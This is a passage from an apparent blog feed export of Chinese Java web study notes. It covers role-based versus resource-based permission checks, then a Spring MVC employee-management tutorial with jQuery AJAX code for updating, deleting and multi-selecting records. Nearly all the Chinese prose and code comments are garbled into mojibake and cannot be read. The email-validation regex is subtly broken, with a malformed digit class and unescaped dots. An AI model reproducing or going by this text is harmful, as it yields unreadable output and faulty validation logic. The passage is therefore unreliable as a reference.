¸å¿ƒ)</h4><p>åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶(RBAC-Role based access control)<br>æ¯”å¦‚ï¼š<br>ç³»ç»Ÿè§’è‰²åŒ…æ‹¬ï¼šéƒ¨é—¨ç»ç†ï¼Œæ€»ç»ç†ï¼ˆè§’è‰²é’ˆå¯¹ç”¨æˆ·æ¥åˆ’åˆ†ï¼‰</p><p>ç³»ç»Ÿä»£ç ä¸­å®ç°ï¼š<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¦‚æœè¯¥useræ˜¯éƒ¨é—¨ç»ç†åˆ™å¯ä»¥è®¿é—®ifä¸­çš„ä»£ç </span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(user.hasRole(<span class="string">'éƒ¨é—¨ç»ç†'</span>)</span></span>)&#123;</span><br><span class="line"><span class="comment">//ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>é—®é¢˜ï¼š<br>è§’è‰²é’ˆå¯¹äººåˆ’åˆ†çš„ï¼Œäººä½œä¸ºç”¨æˆ·åœ¨ç³»ç»Ÿä¸­å±äºæ´»åŠ¨å†…å®¹ï¼Œå¦‚æœè¯¥è§’è‰²å¯ä»¥è®¿é—®çš„èµ„æºå‡ºç°å˜æ›´ï¼Œéœ€è¦ä¿®æ”¹ä½ çš„ä»£ç äº†ï¼Œæ¯”å¦‚ï¼šéœ€æ±‚å˜æ›´ä¸ºéƒ¨é—¨ç»ç†å’Œæ€»ç»ç†éƒ½å¯ä»¥æŸ¥çœ‹ç”¨æˆ·æŠ¥è¡¨ï¼Œä»£ç æ”¹ä¸º<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="keyword">user</span>.hasRole(<span class="string">'éƒ¨é—¨ç»ç†'</span>)|| <span class="keyword">user</span>.hasRole(<span class="string">'æ€»ç»ç†'</span>))&#123;</span><br><span class="line">//ä»£ç </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶æ˜¯ä¸åˆ©äºç³»ç»Ÿç»´æŠ¤çš„(å¯æ‹“å±•æ€§ä¸å¼º)</p><p>åŸºäºèµ„æºçš„è®¿é—®æ§åˆ¶(RBAC-Resource based access control)<br>èµ„æºåœ¨ç³»ç»Ÿä¸­æ˜¯ä¸å˜çš„ï¼Œæ¯”å¦‚èµ„æºæœ‰ï¼šç±»ä¸­çš„æ–¹æ³•ï¼Œé¡µé¢ä¸­çš„æŒ‰é’®</p><p>å¯¹èµ„æºçš„è®¿é—®éœ€è¦å…·æœ‰permissionæƒé™ï¼Œä»£ç å¯ä»¥å†™ä¸ºï¼š<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(user.hasPermission(<span class="string">'ç”¨æˆ·æŠ¥è¡¨æŸ¥çœ‹'</span>)</span></span>)&#123;</span><br><span class="line"><span class="comment">//ä»£ç </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™ç§æ–¹å¼å¯ä»¥è§£å†³ç”¨æˆ·è§’è‰²å˜æ›´ä¸ç”¨ä¿®æ”¹æƒé™æ§åˆ¶çš„ä»£ç </p><p>å¦‚æœéœ€è¦å˜æ›´æƒé™åªéœ€è¦åœ¨åˆ†é…æƒé™æ¨¡å—å»æ“ä½œï¼Œç»™éƒ¨é—¨ç»ç†æˆ–æ€»ç»ç†å¢æˆ–åˆ é™¤æƒé™</p><p>æ‰€ä»¥å»ºè®®ä½¿ç”¨åŸºäºèµ„æºçš„è®¿é—®æ§åˆ¶</p><h2 id="æƒé™ç®¡ç†è§£å†³æ–¹æ¡ˆ"><a href="#æƒé™ç®¡ç†è§£å†³æ–¹æ¡ˆ" class="headerlink" title="æƒé™ç®¡ç†è§£å†³æ–¹æ¡ˆ"></a>æƒé™ç®¡ç†è§£å†³æ–¹æ¡ˆ</h2><h3 id="ä»€ä¹ˆæ˜¯ç²—ç²’åº¦å’Œç»†ç²’åº¦æƒé™"><a href="#ä»€ä¹ˆæ˜¯ç²—ç²’åº¦å’Œç»†ç²’åº¦æƒé™" class="headerlink" title="ä»€ä¹ˆæ˜¯ç²—ç²’åº¦å’Œç»†ç²’åº¦æƒé™"></a>ä»€ä¹ˆæ˜¯ç²—ç²’åº¦å’Œç»†ç²’åº¦æƒé™</h3><ul><li><p>ç²—ç²’åº¦ï¼šå¯¹èµ„æºç±»å‹çš„æƒé™ç®¡ç†</p><ul><li><p>èµ„æºç±»å‹ï¼šèœå•,urlé“¾æ¥,ç”¨æˆ·æ·»åŠ é¡µé¢,ç”¨æˆ·ä¿¡æ¯,ç±»æ–¹æ³•,é¡µé¢ä¸­æŒ‰é’®</p></li><li><p>æ¯”å¦‚ï¼šè¶…çº§ç®¡ç†å‘˜å¯ä»¥è®¿é—®ç”¨æˆ·æ·»åŠ é¡µé¢ï¼Œç”¨æˆ·ä¿¡æ¯ç­‰å…¨éƒ¨é¡µé¢ï¼›éƒ¨é—¨ç®¡ç†å‘˜å¯ä»¥è®¿é—®ç”¨æˆ·ä¿¡æ¯é¡µé¢</p></li></ul></li><li><p>ç»†ç²’åº¦ï¼šå¯¹èµ„æºå®ä¾‹çš„æƒé™ç®¡ç†ï¼Œæ•°æ®çº§åˆ«çš„æƒé™ç®¡ç†</p><ul><li><p>èµ„æºå®ä¾‹ï¼šå°±æ˜¯èµ„æºç±»å‹çš„å…·ä½“åŒ–ï¼Œæ¯”å¦‚ï¼šç”¨æˆ·idä¸º001çš„ä¿®æ”¹è¿æ¥,1110ç­çš„ç”¨æˆ·ä¿¡æ¯,è¡Œæ”¿éƒ¨çš„å‘˜å·¥</p></li><li><p>éƒ¨é—¨ç»ç†åªå¯ä»¥è®¿é—®æœ¬éƒ¨é—¨çš„å‘˜å·¥ä¿¡æ¯ï¼Œç”¨æˆ·åªå¯ä»¥çœ‹åˆ°è‡ªå·±çš„èœå•ï¼Œå¤§åŒºç»ç†åªå¯ä»¥æŸ¥çœ‹æœ¬è¾–åŒºçš„é”€å”®è®¢å•</p></li></ul></li></ul><h3 id="å¦‚ä½•å®ç°"><a href="#å¦‚ä½•å®ç°" class="headerlink" title="å¦‚ä½•å®ç°"></a>å¦‚ä½•å®ç°</h3><h4 id="ç²—ç²’åº¦"><a href="#ç²—ç²’åº¦" class="headerlink" title="ç²—ç²’åº¦"></a>ç²—ç²’åº¦</h4><p>æ¯”è¾ƒå®¹æ˜“å°†æƒé™ç®¡ç†çš„ä»£ç æŠ½å–å‡ºæ¥åœ¨ç³»ç»Ÿæ¶æ„çº§åˆ«ç»Ÿä¸€å¤„ç†</p><p>æ¯”å¦‚ï¼šé€šè¿‡springmvcçš„æ‹¦æˆªå™¨å®ç°æˆæƒ</p><h4 id="ç»†ç²’åº¦"><a href="#ç»†ç²’åº¦" class="headerlink" title="ç»†ç²’åº¦"></a>ç»†ç²’åº¦</h4><p>åœ¨æ•°æ®çº§åˆ«æ²¡æœ‰å…±æ€§å¯è¨€ï¼Œé’ˆå¯¹ç»†ç²’åº¦æƒé™ç®¡ç†å°±æ˜¯ä¸šåŠ¡é€»è¾‘çš„ä¸€éƒ¨åˆ†ï¼Œå¦‚æœåœ¨ä¸šåŠ¡å±‚å»å¤„ç†ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œå¦‚æœå°†ç»†ç²’åº¦æƒé™ç®¡ç†ç»Ÿä¸€åœ¨ç³»ç»Ÿæ¶æ„çº§åˆ«å»æŠ½å–ï¼Œæ¯”è¾ƒå›°éš¾ï¼Œå³ä½¿æŠ½å–çš„åŠŸèƒ½å¯èƒ½ä¹Ÿå­˜åœ¨æ‰©å±•æ€§ä¸å¼º</p><p>å»ºè®®ç»†ç²’åº¦æƒé™ç®¡ç†åœ¨ä¸šåŠ¡å±‚å»æ§åˆ¶</p><p>æ¯”å¦‚ï¼šéƒ¨é—¨ç»ç†åªæŸ¥è¯¢æœ¬éƒ¨é—¨å‘˜å·¥ä¿¡æ¯ï¼Œåœ¨serviceæ¥å£æä¾›ä¸€ä¸ªéƒ¨é—¨idçš„å‚æ•°ï¼Œcontrollerä¸­æ ¹æ®å½“å‰ç”¨æˆ·çš„ä¿¡æ¯å¾—åˆ°è¯¥ç”¨æˆ·å±äºå“ªä¸ªéƒ¨é—¨ï¼Œè°ƒç”¨serviceå°†éƒ¨é—¨idä¼ å…¥serviceï¼Œå®ç°è¯¥ç”¨æˆ·åªæŸ¥è¯¢æœ¬éƒ¨é—¨çš„å‘˜å·¥</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Shiro&quot;&gt;&lt;a href=&quot;#Shiro&quot; class=&quot;headerlink&quot; title=&quot;Shiro&quot;&gt;&lt;/a&gt;Shiro&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;å­¦ä¹ ç›®æ ‡&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;åŸºäºurlæƒé™ç®¡ç†å’ŒshiroåŸºç¡€&lt;/p&gt;
&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>SSM-2020/10/21-å‘˜å·¥ç®¡ç†ç³»ç»Ÿ-5</title>
    <link href="http://yoursite.com/2020/10/21/SSM-2020-10-21-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/10/21/SSM-2020-10-21-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-21T10:30:53.000Z</published>
    <updated>2021-02-21T04:57:52.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‘˜å·¥ä¿®æ”¹"><a href="#å‘˜å·¥ä¿®æ”¹" class="headerlink" title="å‘˜å·¥ä¿®æ”¹"></a>å‘˜å·¥ä¿®æ”¹</h1><h2 id="æ›´æ–°ä¿¡æ¯"><a href="#æ›´æ–°ä¿¡æ¯" class="headerlink" title="æ›´æ–°ä¿¡æ¯"></a>æ›´æ–°ä¿¡æ¯</h2><p>å¦‚æœå°†è¯·æ±‚ç›´æ¥æ”¹ä¸ºPUTï¼Œå°±ä¼šå‘ç°æ•°æ®æ— æ³•ä¿®æ”¹ï¼Œè¯·æ±‚ä½“ä¸­æœ‰æ•°æ®ä½†Employeeå°è£…ä¸ä¸Š</p><p>åŸå› ï¼š</p><ul><li><p>tomcat:</p><ol><li><p>å°†è¯·æ±‚ä½“ä¸­çš„æ•°æ®ï¼Œå°è£…ä¸€ä¸ªmap</p></li><li><p>request.getParameter(â€œempNameâ€)å°±ä¼šä»è¿™ä¸ªmapä¸­å–å€¼</p></li><li><p>SpringMVCå°è£…POJOå¯¹è±¡çš„æ—¶å€™ï¼Œä¼šæŠŠPOJOç§æ¯ä¸ªå±æ€§çš„å€¼ï¼Œrequest.getParamter(â€œemailâ€);</p></li><li><p>Tomcatæ£€æµ‹åˆ°PUTè¯·æ±‚å°±ä¸ä¼šå°è£…è¯·æ±‚ä½“æ•°æ®ä¸ºmapï¼Œåªæœ‰POSTè¯·æ±‚æ‰ä¼šå°è£…è¯·æ±‚ä½“</p></li></ol></li></ul><p>è§£å†³åŠæ³•ï¼š<br>ä½¿ç”¨SpringMVCæä¾›çš„è¿‡æ»¤å™¨HttpPutFormContentFilter</p><p>å®ƒçš„ä½œç”¨ï¼Œå°†è¯·æ±‚ä½“ä¸­çš„æ•°æ®è§£æåŒ…è£…æˆä¸€ä¸ªmapï¼Œrequestè¢«é‡æ–°åŒ…è£…,request.getParameter()è¢«é‡å†™ï¼Œå°±ä¼šä»è‡ªå·±å°è£…çš„mapä¸­å–æ•°æ®</p><p>åœ¨web.xmlä¸­æ·»åŠ è¿‡æ»¤å™¨<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">filter</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;HttpPutFormContentFilter&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;org.springframework.web.<span class="keyword">filter</span>.HttpPutFormContentFilter&lt;/<span class="keyword">filter</span>-<span class="keyword">class</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">filter</span>&gt;</span><br><span class="line">&lt;<span class="keyword">filter</span>-<span class="keyword">mapping</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">filter</span>-<span class="type">name</span>&gt;HttpPutFormContentFilter&lt;/<span class="keyword">filter</span>-<span class="type">name</span>&gt;</span><br><span class="line">  &lt;url-pattern&gt;<span class="comment">/*&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="comment">&lt;/filter-mapping&gt;</span></span><br></pre></td></tr></table></figure></p><p>index.jsp<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç‚¹å‡»æ›´æ–°ï¼Œæ›´æ–°å‘˜å·¥ä¿¡æ¯</span></span><br><span class="line">$(<span class="string">"#emp_update_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.éªŒè¯é‚®ç®±æ˜¯å¦åˆæ³•</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_update_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        <span class="comment">// alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"error"</span>,<span class="string">"é‚®ç®±æ ¼å¼ä¸æ­£ç¡®"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.å‘é€ajaxè¯·æ±‚ï¼Œä¿å­˜æ›´æ–°çš„å‘˜å·¥æ•°æ®</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+$(<span class="keyword">this</span>).attr(<span class="string">"edit-id"</span>),</span><br><span class="line">        type:<span class="string">"PUT"</span>,</span><br><span class="line">        data:$(<span class="string">"#empUpdateModal form"</span>).serialize(),</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            alert(result.msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>ç°åœ¨å°±æˆåŠŸçš„æ›´æ”¹äº†ç”¨æˆ·çš„æ•°æ®</p><p>æ¥ä¸‹æ¥å°±æ˜¯å®Œå–„è¿™ä¸ªæ›´æ–°é€»è¾‘ï¼Œè®©å…¶ä¸ä¹‹å‰çš„æ·»åŠ åŠŸèƒ½ç›¸åŒï¼ˆå…³é—­æ¨¡æ€æ¡†ï¼Œæ˜¾ç¤ºå½“å‰é¡µï¼‰</p><p>å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡currentPageï¼Œå¹¶åœ¨åˆ†é¡µä¿¡æ¯å¤„èµ‹å€¼<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">currentPage</span> = result.extend.pageInfo.pageNum<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>æœ€åçš„ç¼–è¾‘åŠŸèƒ½<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç‚¹å‡»æ›´æ–°ï¼Œæ›´æ–°å‘˜å·¥ä¿¡æ¯</span></span><br><span class="line">$(<span class="string">"#emp_update_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.éªŒè¯é‚®ç®±æ˜¯å¦åˆæ³•</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_update_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        <span class="comment">// alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"error"</span>,<span class="string">"é‚®ç®±æ ¼å¼ä¸æ­£ç¡®"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#email_update_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2.å‘é€ajaxè¯·æ±‚ï¼Œä¿å­˜æ›´æ–°çš„å‘˜å·¥æ•°æ®</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+$(<span class="keyword">this</span>).attr(<span class="string">"edit-id"</span>),</span><br><span class="line">        type:<span class="string">"PUT"</span>,</span><br><span class="line">        data:$(<span class="string">"#empUpdateModal form"</span>).serialize(),</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//alert(result.msg);</span></span><br><span class="line">            <span class="comment">//1.å…³é—­æ¨¡æ€æ¡†</span></span><br><span class="line">            $(<span class="string">"#empUpdateModal"</span>).modal(<span class="string">"hide"</span>);</span><br><span class="line">            <span class="comment">//2.å›åˆ°æœ¬é¡µé¢</span></span><br><span class="line">            to_page(currentPage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h1 id="å‘˜å·¥åˆ é™¤"><a href="#å‘˜å·¥åˆ é™¤" class="headerlink" title="å‘˜å·¥åˆ é™¤"></a>å‘˜å·¥åˆ é™¤</h1><p>æ•ˆæœå›¾ï¼š<br><img src="/img/JavaWeb/10-21å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><p>æˆ‘ä»¬æƒ³è¦å®ç°çš„åŠŸèƒ½å°±æ˜¯ä¸¤ç§ï¼Œç¬¬ä¸€ç§æ˜¯å•é¡¹åˆ é™¤ï¼Œç¬¬äºŒç§å°±æ˜¯é€‰ä¸­ç„¶åä¸€é”®åˆ é™¤</p><p>é€»è¾‘ï¼š</p><ol><li>å•ä¸ªåˆ é™¤<ul><li>URIï¼š/emp{id} DELETE</li></ul></li></ol><h2 id="å•ä¸ªåˆ é™¤"><a href="#å•ä¸ªåˆ é™¤" class="headerlink" title="å•ä¸ªåˆ é™¤"></a>å•ä¸ªåˆ é™¤</h2><p>å’Œä¹‹å‰çš„ç¼–è¾‘å·®ä¸å¤š</p><p>åœ¨Controllerä¸­æ·»åŠ <br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@ResponseBody</span></span><br><span class="line"><span class="variable">@RequestMapping</span>(value = <span class="string">"/emp/&#123;id&#125;"</span>,method = RequestMethod.DELETE)</span><br><span class="line">public Msg deleteEmpById(<span class="variable">@PathVariable</span>(<span class="string">"id"</span>)Integer id)&#123;</span><br><span class="line">    <span class="selector-tag">employeeService</span><span class="selector-class">.deleteEmp</span>(id);</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">Msg</span><span class="selector-class">.success</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Service:<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‘˜å·¥åˆ é™¤</span></span><br><span class="line"><span class="comment"> * @param id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public void delete<span class="constructor">Emp(Integer <span class="params">id</span>)</span> &#123;</span><br><span class="line">    employeeMapper.delete<span class="constructor">ByPrimaryKey(<span class="params">id</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç»™åˆ é™¤æŒ‰é’®æ·»åŠ è‡ªå®šä¹‰å±æ€§â€del-idâ€</p><p>index.jspï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å•ä¸ªåˆ é™¤</span></span><br><span class="line">$(<span class="built_in">document</span>).on(<span class="string">"click"</span>,<span class="string">".delete_btn"</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.å¼¹å‡ºç¡®è®¤åˆ é™¤å¯¹è¯æ¡†</span></span><br><span class="line">    <span class="keyword">var</span> empName = $(<span class="keyword">this</span>).parents(<span class="string">"tr"</span>).find(<span class="string">"td:eq(1)"</span>).text();</span><br><span class="line">    <span class="keyword">var</span> empId = $(<span class="keyword">this</span>).attr(<span class="string">"del-id"</span>);</span><br><span class="line">    <span class="comment">//alert($(this).parents("tr").find("td:eq(1)").text());</span></span><br><span class="line">    <span class="keyword">if</span>(confirm(<span class="string">"ç¡®è®¤åˆ é™¤["</span>+empName+<span class="string">"]å—ï¼Ÿ"</span>))&#123;</span><br><span class="line">        <span class="comment">//ç¡®è®¤ï¼Œå‘é€ajaxè¯·æ±‚åˆ é™¤å³å¯</span></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">           url:<span class="string">"$&#123;APP_PATH&#125;/emp/"</span>+empId,</span><br><span class="line">            type:<span class="string">"DELETE"</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">                alert(result.msg);</span><br><span class="line">                <span class="comment">//å›åˆ°æœ¬é¡µ</span></span><br><span class="line">                to_page(currentPage);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>å•ä¸ªåˆ é™¤ç›®å‰åŠŸèƒ½å·²ç»å®ç°äº†</p><h2 id="å¤šé€‰åˆ é™¤"><a href="#å¤šé€‰åˆ é™¤" class="headerlink" title="å¤šé€‰åˆ é™¤"></a>å¤šé€‰åˆ é™¤</h2><p>è¡¨å¤´éœ€è¦ä¸€ä¸ªcheckbox</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;tr&gt;</span></span><br><span class="line">    <span class="symbol">&lt;th&gt;</span></span><br><span class="line">        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"checkbox"</span> id=<span class="string">"check_all"</span>/&gt;</span><br><span class="line">    &lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>#&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>empName&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>gender&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>email&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>deptName&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">    <span class="symbol">&lt;th&gt;</span>æ“ä½œ&lt;/<span class="keyword">th</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">tr</span>&gt;</span><br></pre></td></tr></table></figure><p>åŒæ—¶ä¹Ÿè¦ç»™ä»–æ·»åŠ è¿›éå†é‡Œ<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">build_emps_tables</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//æ¸…ç©ºtable</span></span><br><span class="line">    $(<span class="string">"#emps_table tbody"</span>).empty();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> emps=result.extend.pageInfo.list;</span><br><span class="line">    $.each(emps,<span class="function"><span class="keyword">function</span> (<span class="params">index,item</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> checkBoxTd = $(<span class="string">"&lt;td&gt;&lt;input type='checkbox' class='check_item' /&gt;&lt;/td&gt;"</span>);</span><br></pre></td></tr></table></figure></p><p>æ¥ç€ç¼–å†™ç‚¹å‡»äº‹ä»¶<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®Œæˆå…¨é€‰/å…¨ä¸é€‰</span></span><br><span class="line">$(<span class="string">"#check_all"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//attrè·å–checkedæ˜¯undefined</span></span><br><span class="line">    <span class="comment">//æˆ‘ä»¬è¿™äº›domåŸç”Ÿçš„å±æ€§,attrè·å–è‡ªå®šä¹‰å±æ€§çš„å€¼</span></span><br><span class="line">    <span class="comment">//propä¿®æ”¹å’Œè¯»å–domåŸç”Ÿå±æ€§çš„å€¼</span></span><br><span class="line">   $(<span class="string">".check_item"</span>).prop(<span class="string">"checked"</span>,$(<span class="keyword">this</span>).prop(<span class="string">"checked"</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­å½“å‰é€‰æ‹©ä¸­çš„å…ƒç´ æ˜¯å¦5ä¸ª</span></span><br><span class="line">$(<span class="built_in">document</span>).on(<span class="string">"click"</span>,<span class="string">".check_item"</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = $(<span class="string">".check_item:checked"</span>).length == 